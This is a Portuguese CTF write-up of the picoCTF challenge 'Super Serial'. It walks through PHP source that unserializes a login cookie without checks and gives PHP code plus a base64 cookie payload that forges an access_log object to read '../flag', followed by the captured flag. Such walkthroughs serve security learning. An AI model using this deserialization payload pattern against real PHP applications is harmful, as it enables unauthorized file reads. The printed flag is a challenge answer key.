# [Super Serial]  
###### Resolvido por @[SebastiaoKomada]  
> Desafio Web Exploitation  

## Sobre o Desafio  
O enunciado apresenta a seguinte descrição: *“Tente recuperar a bandeira armazenada neste site `http://mercury.picoctf.net:14804/`”*.  
Junto a isso, foi disponibilizada a dica: *“A bandeira está em ../flag”*.  

De imediato, já fica claro que o objetivo é encontrar uma maneira de acessar um arquivo dentro do servidor. Ou seja, precisamos explorar o código para identificar uma vulnerabilidade que nos permita ler esse arquivo oculto.  

## Solução  

### Análise inicial do código  
Ao abrir a aplicação web, encontramos um formulário de login:  

<img width="1364" height="768" alt="image" src="https://github.com/user-attachments/assets/aa73348e-c943-4e9d-8f2a-223548199ea3" />  

Ao acessar o arquivo `index.phps`, descobrimos o seguinte código:  

```php
<?php
require_once("cookie.php");

if(isset($_POST["user"]) && isset($_POST["pass"])){
	$con = new SQLite3("../users.db");
	$username = $_POST["user"];
	$password = $_POST["pass"];
	$perm_res = new permissions($username, $password);
	if ($perm_res->is_guest() || $perm_res->is_admin()) {
		setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
		header("Location: authentication.php");
		die();
	} else {
		$msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
	}
}
?>
```

Esse código já nos dá algumas pistas:  
Existem pelo menos dois arquivos importantes: `cookie.php` e `authentication.php`.  
Caso o login seja válido, o sistema cria um **cookie chamado `login`**, que é **serializado** e depois **codificado em Base64**.  

Quando abrimos o arquivo `cookie.php`, encontramos o seguinte código:  

```php
<?php
session_start();

class permissions
{
	public $username;
	public $password;

	function __construct($u, $p) {
		$this->username = $u;
		$this->password = $p;
	}

	function __toString() {
		return $u.$p;
	}

	function is_guest() {
		$guest = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] != 1) {
				$guest = true;
			}
		}
		return $guest;
	}

	function is_admin() {
		$admin = false;

		$con = new SQLite3("../users.db");
		$username = $this->username;
		$password = $this->password;
		$stm = $con->prepare("SELECT admin, username FROM users WHERE username=? AND password=?");
		$stm->bindValue(1, $username, SQLITE3_TEXT);
		$stm->bindValue(2, $password, SQLITE3_TEXT);
		$res = $stm->execute();
		$rest = $res->fetchArray();
		if($rest["username"]) {
			if ($rest["admin"] == 1) {
				$admin = true;
			}
		}
		return $admin;
	}
}

if(isset($_COOKIE["login"])){
	try{
		$perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
		$g = $perm->is_guest();
		$a = $perm->is_admin();
	}
	catch(Error $e){
		die("Deserialization error. ".$perm);
	}
}
?>
```

Aqui percebemos um detalhe importante:  
Se o cookie `login` existir, ele é **decodificado, desserializado** e usado diretamente.  
Isso abre uma brecha: podemos manipular o conteúdo desse cookie e forjar informações.  

Agora vamos olhar para `authentication.php`:  

```php
<?php

class access_log
{
	public $log_file;

	function __construct($lf) {
		$this->log_file = $lf;
	}

	function __toString() {
		return $this->read_log();
	}

	function append_to_log($data) {
		file_put_contents($this->log_file, $data, FILE_APPEND);
	}

	function read_log() {
		return file_get_contents($this->log_file);
	}
}

require_once("cookie.php");
if(isset($perm) && $perm->is_admin()){
	$msg = "Welcome admin";
	$log = new access_log("access.log");
	$log->append_to_log("Logged in at ".date("Y-m-d")."
");
} else {
	$msg = "Welcome guest";
}
?>
```

O ponto crucial está na classe `access_log`, quando o objeto é convertido em string, a função `__toString()` chama o método `read_log()`, que lê o conteúdo do arquivo especificado em `$log_file`.  

Com a vulnerabilidade do cookie, percebemos que é possível criar um novo objeto, serializá-lo e forjar o cookie para apontar diretamente para o arquivo `../flag`.  

### Criando o exploit  
Podemos simular essa lógica com o seguinte código:  

```php
<?php
class access_log {
    public $log_file;
}

$o = new access_log();
$o->log_file = "../flag";

echo serialize($o), "
";
echo base64_encode(serialize($o)), "
";
?>
```

Executando esse código, temos:  

```
O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
```

Basta então substituir o valor do cookie `login` por essa string em Base64, recarregar a página e por fim, a flag aparece:  

<img width="1364" height="768" alt="image" src="https://github.com/user-attachments/assets/406135fb-95cf-4a10-85cf-e1e709229344" />  

### Flag encontrada  
**Flag:** `picoCTF{th15_vu1n_1s_5up3r_53r1ous_y4ll_261d1dcc}`  
